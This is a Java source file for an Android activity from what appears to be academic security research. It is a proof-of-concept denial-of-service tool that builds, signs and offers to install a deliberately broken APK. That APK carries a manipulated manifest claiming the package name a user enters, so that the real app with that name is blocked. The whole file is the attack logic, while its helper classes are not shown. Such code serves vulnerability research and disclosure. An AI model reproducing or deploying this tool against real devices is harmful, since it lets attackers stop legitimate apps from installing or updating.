package de.ecspride;

import java.io.File;
import java.io.IOException;
import java.security.GeneralSecurityException;

import android.app.Activity;
import android.content.Intent;
import android.content.pm.ActivityInfo;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;
import de.ecspride.utils.Compress;
import de.ecspride.utils.FileUtils;
import de.ecspride.utils.Signer;

/**
 * 
 * @author Siegfried Rasthofer and Stephan Huber
 *
 */
public class DOSingU extends Activity {

	private static final String TAG = "DOS";
	private EditText editT;
	private Button button;
	
	
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_dosing_u);
		setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_PORTRAIT);
		
		Settings.workingDir = this.getFilesDir().toString();
	}
	
	public void startDOSing(View view){			
	 	editT = (EditText)findViewById(R.id.packageName);
	 	button = (Button) findViewById(R.id.button1);
	 	String userInput = editT.getText().toString();
	 	
	 	if(userInput.matches("") || !userInput.contains("."))
	 		Toast.makeText(getApplicationContext(), "You have to input an package (e.g. a.b.c.d) name to block", Toast.LENGTH_LONG).show();
	 	else{	 		
	 		new APKBuildingTask(userInput, this.getFilesDir().toString()).execute();
	 		
	 	}
	}
	
	public void prepareDosing(String packageName, String targetFolder){
		try{
			//first copy brokenApk from Assets to sdcard
 			FileUtils.copyBrokenApkFromAssetsToInternalStorage(getApplicationContext(), targetFolder);
			
			//second add manipulated AndroidManifest to brokenApk (dosApk) on sdcard
			FileUtils.addManipulatedManifestToInternalStorage(getApplicationContext(), packageName, targetFolder);
		}catch(Exception ex){
			ex.printStackTrace();
		}
	}
	
	private void installBrokenApk(String apkPath){
		Intent intent = new Intent(Intent.ACTION_VIEW);
		intent.setDataAndType(Uri.fromFile(new File(apkPath)), "application/vnd.android.package-archive");
		startActivity(intent); 
	}
	
	private class APKBuildingTask extends AsyncTask<String, Object, String> {
		private String workingFolder;
		private String newPackage;
		
		public APKBuildingTask(String newPackage, String workingFolder) {
			this.workingFolder = workingFolder;
			this.newPackage = newPackage;
		}
		@Override
		protected void onPreExecute() {
			FileUtils.purgeDirectory(new File(workingFolder));
			Log.d(TAG, "Create sign folder");
			File f = new File(workingFolder + Settings.SIGNFOLDER);
			f.mkdir();
			
			editT.setEnabled(false);	
			button.setEnabled(false);
		}
		@Override
		protected String doInBackground(String... params) {
			Log.d(TAG, "copy Asset");
			prepareDosing(newPackage, workingFolder + Settings.SIGNFOLDER);
			Log.d(TAG, "Signing process ...");
	 		try {
				Signer.sign(workingFolder + Settings.SIGNFOLDER, R.raw.prkey, R.raw.cert, DOSingU.this);
				Log.d(TAG, "compressing...");
				Compress zip = new Compress(DOSingU.this, workingFolder + Settings.SIGNFOLDER, Settings.INSTALLAPK);
				zip.zip(false);
			} catch (IOException e) {
				e.printStackTrace();
			} catch (GeneralSecurityException e) {
				e.printStackTrace();
			} catch (Exception e) {
				e.printStackTrace();
			}
			return "finish";
		}
		
		@Override @Deprecated
		protected void onPostExecute(String result) {
			Log.d(TAG, "Ende, status " + result);

			Log.d(TAG, "Install broken apk...");
			
			installBrokenApk(workingFolder + File.separator + Settings.INSTALLAPK);
			
			editT.setEnabled(true);
			button.setEnabled(true);
		}
		
	}
	
}
